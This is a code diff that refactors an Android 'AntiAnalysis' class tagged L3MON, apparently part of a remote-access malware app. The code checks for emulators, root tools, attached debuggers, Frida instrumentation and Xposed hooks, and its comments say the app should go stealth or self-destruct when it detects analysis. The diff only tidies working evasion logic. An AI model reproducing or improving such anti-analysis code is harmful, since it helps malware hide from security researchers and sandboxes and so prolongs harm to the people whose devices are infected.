@@ -23,14 +23,24 @@ public class AntiAnalysis {
 
     private static final String TAG = "L3MON-Anti";
     private static Context context;
+    private static final String GENERIC = "generic";
+    private static final String VBOX = "vbox";
+    private static final String GOOGLE_SDK = "google_sdk";
+
+    // Private constructor to hide the implicit public one
+    private AntiAnalysis() {
+        // Utility class - no instantiation
+    }
 
     public static void init(Context ctx) {
         context = ctx;
     }
 
     /**
-     * Main check - returns true if the environment is considered "safe" for operation.
-     * Returns false if analysis environment is detected (should go stealth or self-destruct).
+     * Main check - returns true if the environment is considered "safe" for
+     * operation.
+     * Returns false if analysis environment is detected (should go stealth or
+     * self-destruct).
      */
     public static boolean isSafeEnvironment() {
         if (isEmulator()) {
@@ -70,67 +80,64 @@ public class AntiAnalysis {
             report.put("manufacturer", Build.MANUFACTURER);
             report.put("safe", isSafeEnvironment());
         } catch (Exception e) {
-            e.printStackTrace();
+            android.util.Log.e(TAG, "Error generating detection report", e);
         }
         return report;
     }
 
     // ==================== EMULATOR DETECTION ====================
+
     public static boolean isEmulator() {
         try {
-            // Common emulator fingerprints
-            String fingerprint = Build.FINGERPRINT;
-            String model = Build.MODEL;
-            String manufacturer = Build.MANUFACTURER;
-            String brand = Build.BRAND;
-            String device = Build.DEVICE;
-            String product = Build.PRODUCT;
-
-            if (fingerprint.startsWith("generic")
-                    || fingerprint.contains("vbox")
-                    || fingerprint.contains("test-keys")
-                    || fingerprint.contains("sdk_gphone")
-                    || fingerprint.contains("emulator")
-                    || fingerprint.contains("google_sdk")) {
-                return true;
-            }
-
-            if (model.contains("google_sdk")
-                    || model.contains("Emulator")
-                    || model.contains("Android SDK built for x86")
-                    || model.contains("sdk")
-                    || model.contains("Genymotion")) {
-                return true;
-            }
-
-            if (manufacturer.contains("Genymotion")
-                    || brand.contains("generic")
-                    || brand.contains("google")
-                    || device.contains("generic")
-                    || product.contains("sdk")) {
-                return true;
-            }
-
-            // Check for QEMU / Goldfish
-            if (hasQemuProperties() || hasEmulatorFiles()) {
-                return true;
-            }
-
-            // Telephony check
-            if (context != null) {
-                TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-                if (tm != null) {
-                    String operator = tm.getNetworkOperatorName();
-                    if (operator != null && (operator.toLowerCase().contains("android") || operator.equals("Android"))) {
-                        return true;
-                    }
-                }
-            }
-
-            return false;
+            return isEmulatorByFingerprint() || isEmulatorByModel() ||
+                    isEmulatorByManufacturer() || hasQemuProperties() ||
+                    hasEmulatorFiles() || isEmulatorByTelephony();
         } catch (Exception e) {
             return false;
         }
+    }
+
+    private static boolean isEmulatorByFingerprint() {
+        String fingerprint = Build.FINGERPRINT;
+        return fingerprint.startsWith(GENERIC)
+                || fingerprint.contains(VBOX)
+                || fingerprint.contains("test-keys")
+                || fingerprint.contains("sdk_gphone")
+                || fingerprint.contains("emulator")
+                || fingerprint.contains(GOOGLE_SDK);
+    }
+
+    private static boolean isEmulatorByModel() {
+        String model = Build.MODEL;
+        return model.contains(GOOGLE_SDK)
+                || model.contains("Emulator")
+                || model.contains("Android SDK built for x86")
+                || model.contains("sdk")
+                || model.contains("Genymotion");
+    }
+
+    private static boolean isEmulatorByManufacturer() {
+        String manufacturer = Build.MANUFACTURER;
+        String brand = Build.BRAND;
+        String device = Build.DEVICE;
+        String product = Build.PRODUCT;
+
+        return manufacturer.contains("Genymotion")
+                || brand.contains(GENERIC)
+                || brand.contains("google")
+                || device.contains(GENERIC)
+                || product.contains("sdk");
+    }
+
+    private static boolean isEmulatorByTelephony() {
+        if (context != null) {
+            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+            if (tm != null) {
+                String operator = tm.getNetworkOperatorName();
+                return operator != null && (operator.toLowerCase().contains("android") || operator.equals("Android"));
+            }
+        }
+        return false;
     }
 
     private static boolean hasQemuProperties() {
@@ -189,8 +196,8 @@ public class AntiAnalysis {
 
             // Check for Magisk / common root apps
             if (isPackageInstalled("com.topjohnwu.magisk") ||
-                isPackageInstalled("eu.chainfire.supersu") ||
-                isPackageInstalled("com.noshufou.android.su")) {
+                    isPackageInstalled("eu.chainfire.supersu") ||
+                    isPackageInstalled("com.noshufou.android.su")) {
                 return true;
             }
 
@@ -207,7 +214,8 @@ public class AntiAnalysis {
 
     private static boolean isPackageInstalled(String packageName) {
         try {
-            if (context == null) return false;
+            if (context == null)
+                return false;
             context.getPackageManager().getPackageInfo(packageName, 0);
             return true;
         } catch (Exception e) {
@@ -217,9 +225,10 @@ public class AntiAnalysis {
 
     private static boolean canExecuteCommand(String command) {
         try {
-            Process process = Runtime.getRuntime().exec(new String[]{"which", command});
-            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
-            return in.readLine() != null;
+            Process process = Runtime.getRuntime().exec(new String[] { "which", command });
+            try (BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
+                return in.readLine() != null;
+            }
         } catch (Exception e) {
             return false;
         }
@@ -229,42 +238,35 @@ public class AntiAnalysis {
     public static boolean isDebuggerAttached() {
         try {
             return Debug.isDebuggerConnected() ||
-                   (context != null && (context.getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0) ||
-                   Settings.Global.getInt(context.getContentResolver(), Settings.Global.ADB_ENABLED, 0) == 1;
+                    (context != null && (context.getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0) ||
+                    Settings.Global.getInt(context.getContentResolver(), Settings.Global.ADB_ENABLED, 0) == 1;
         } catch (Exception e) {
             return false;
         }
     }
 
     // ==================== FRIDA DETECTION ====================
+    private static final String[] FRIDA_PATHS = {
+            "/data/local/tmp/frida-server",
+            "/data/local/tmp/re.frida.server",
+            "/sdcard/frida-gadget",
+            "/data/app/frida",
+            "/data/local/tmp/frida"
+    };
+
     public static boolean isFridaDetected() {
         try {
             // Check for frida-gadget / frida-server
-            String[] fridaPaths = {
-                    "/data/local/tmp/frida-server",
-                    "/data/local/tmp/re.frida.server",
-                    "/sdcard/frida-gadget",
-                    "/data/app/frida",
-                    "/data/local/tmp/frida"
-            };
-
-            for (String path : fridaPaths) {
+            for (String path : FRIDA_PATHS) {
                 if (new File(path).exists()) {
                     return true;
                 }
             }
 
             // Check running processes (simple version)
-            try {
-                Process p = Runtime.getRuntime().exec("ps");
-                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    if (line.toLowerCase().contains("frida") || line.contains("gadget")) {
-                        return true;
-                    }
-                }
-            } catch (Exception ignored) {}
+            if (isFridaInProcesses()) {
+                return true;
+            }
 
             // Check for frida in maps (advanced - simplified here)
             return checkFridaInMaps();
@@ -273,46 +275,65 @@ public class AntiAnalysis {
         }
     }
 
+    private static boolean isFridaInProcesses() {
+        try {
+            Process p = Runtime.getRuntime().exec("ps");
+            try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    if (line.toLowerCase().contains("frida") || line.contains("gadget")) {
+                        return true;
+                    }
+                }
+            }
+        } catch (Exception e) {
+            android.util.Log.d(TAG, "Error checking Frida in processes");
+        }
+        return false;
+    }
+
     private static boolean checkFridaInMaps() {
         try {
             File maps = new File("/proc/self/maps");
-            if (!maps.exists()) return false;
+            if (!maps.exists()) {
+                return false;
+            }
 
-            BufferedReader reader = new BufferedReader(new InputStreamReader(java.nio.file.Files.newInputStream(maps.toPath())));
-            String line;
-            while ((line = reader.readLine()) != null) {
-                if (line.contains("frida") || line.contains("gadget") || line.contains("re.frida")) {
-                    return true;
+            try (BufferedReader reader = new BufferedReader(new InputStreamReader(new java.io.FileInputStream(maps)))) {
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    if (line.contains("frida") || line.contains("gadget") || line.contains("re.frida")) {
+                        return true;
+                    }
                 }
             }
-        } catch (Exception ignored) {}
+        } catch (Exception e) {
+            android.util.Log.d(TAG, "Error checking Frida in maps");
+        }
         return false;
     }
 
     // ==================== SANDBOX / ANALYSIS TOOLS ====================
+    private static final String[] SUSPICIOUS_PACKAGES = {
+            "com.android.vending.billing.InAppBillingService",
+            "com.saurik.substrate",
+            "de.robv.android.xposed.installer",
+            "com.topjohnwu.magisk",
+            "org.meowcat.edxposed.manager"
+    };
+    private static final String XPOSED_PROPERTY = "vxp";
+
     public static boolean isRunningInSandbox() {
         try {
-            // Common analysis / sandbox indicators
-            String[] suspiciousPackages = {
-                    "com.android.vending.billing.InAppBillingService",
-                    "com.saurik.substrate",
-                    "de.robv.android.xposed.installer",
-                    "com.topjohnwu.magisk",
-                    "org.meowcat.edxposed.manager"
-            };
-
-            for (String pkg : suspiciousPackages) {
+            // Check for suspicious packages
+            for (String pkg : SUSPICIOUS_PACKAGES) {
                 if (isPackageInstalled(pkg)) {
                     return true;
                 }
             }
 
             // Check for Xposed / EdXposed
-            if (System.getProperty("vxp") != null) {
-                return true;
-            }
-
-            return false;
+            return System.getProperty(XPOSED_PROPERTY) != null;
         } catch (Exception e) {
             return false;
         }
@@ -322,8 +343,9 @@ public class AntiAnalysis {
     private static String getSystemProperty(String propName) {
         try {
             Process p = Runtime.getRuntime().exec("getprop " + propName);
-            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-            return reader.readLine();
+            try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
+                return reader.readLine();
+            }
         } catch (Exception e) {
             return null;
         }
